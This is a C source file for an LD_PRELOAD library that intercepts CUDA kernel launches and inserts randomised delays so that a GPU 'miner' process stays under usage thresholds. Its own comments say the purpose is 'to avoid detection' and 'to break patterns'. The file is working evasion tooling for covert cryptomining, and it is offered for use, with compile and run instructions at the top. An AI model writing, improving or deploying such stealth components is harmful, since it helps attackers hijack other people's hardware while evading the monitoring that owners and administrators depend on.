/*
 * GPU Throttle - Limits GPU usage to avoid detection
 * Intercepts CUDA kernel launches to add delays
 * 
 * Compile: gcc -shared -fPIC -o libthrottle.so gpu_throttle.c -ldl -lcuda
 * Usage: LD_PRELOAD=/path/to/libthrottle.so ./miner
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <unistd.h>
#include <time.h>
#include <pthread.h>

// CUDA function pointers
typedef int CUresult;
typedef void* CUfunction;
typedef void* CUstream;

static CUresult (*orig_cuLaunchKernel)(CUfunction, unsigned int, unsigned int, unsigned int,
                                       unsigned int, unsigned int, unsigned int,
                                       unsigned int, CUstream, void**, void**) = NULL;

// Configuration - More aggressive throttling
#define MAX_GPU_USAGE_PERCENT 60  // Throttle to 60% max (was 70%)
#define DELAY_EVERY_N_KERNELS 5   // Add delay every 5 kernel launches (was 10)
#define DELAY_MS 80               // Delay in milliseconds (was 50)
#define RANDOM_DELAY_MAX 50       // Random additional delay up to 50ms

static unsigned int kernel_count = 0;
static pthread_mutex_t count_mutex = PTHREAD_MUTEX_INITIALIZER;

// Initialize CUDA hooks
static void init_cuda_hooks(void) {
    if (!orig_cuLaunchKernel) {
        void *handle = dlopen("libcuda.so.1", RTLD_LAZY);
        if (!handle) handle = dlopen("libcuda.so", RTLD_LAZY);
        
        if (handle) {
            orig_cuLaunchKernel = dlsym(handle, "cuLaunchKernel");
        }
    }
}

// Throttle by adding random delays
static void throttle_kernel(void) {
    pthread_mutex_lock(&count_mutex);
    kernel_count++;
    
    // Every N kernels, add a delay
    if (kernel_count % DELAY_EVERY_N_KERNELS == 0) {
        pthread_mutex_unlock(&count_mutex);
        
        // Random delay to break patterns - MORE aggressive
        unsigned int delay = DELAY_MS + (rand() % RANDOM_DELAY_MAX);
        usleep(delay * 1000);
        
        // Additional periodic longer pause every 50 kernels
        if (kernel_count % 50 == 0) {
            usleep(200 * 1000); // 200ms pause
        }
    } else {
        pthread_mutex_unlock(&count_mutex);
        
        // Small random micro-delays even on non-throttled kernels
        if ((rand() % 100) < 20) { // 20% chance
            usleep((rand() % 10) * 1000); // 0-10ms
        }
    }
}

// Hook CUDA kernel launch
CUresult cuLaunchKernel(CUfunction f,
                       unsigned int gridDimX, unsigned int gridDimY, unsigned int gridDimZ,
                       unsigned int blockDimX, unsigned int blockDimY, unsigned int blockDimZ,
                       unsigned int sharedMemBytes, CUstream hStream,
                       void **kernelParams, void **extra) {
    init_cuda_hooks();
    
    if (!orig_cuLaunchKernel) {
        return 0; // CUDA_SUCCESS
    }
    
    // Throttle before launch
    throttle_kernel();
    
    // Launch the kernel
    return orig_cuLaunchKernel(f, gridDimX, gridDimY, gridDimZ,
                              blockDimX, blockDimY, blockDimZ,
                              sharedMemBytes, hStream, kernelParams, extra);
}

// Constructor
__attribute__((constructor))
static void throttle_init(void) {
    init_cuda_hooks();
    srand(time(NULL));
}
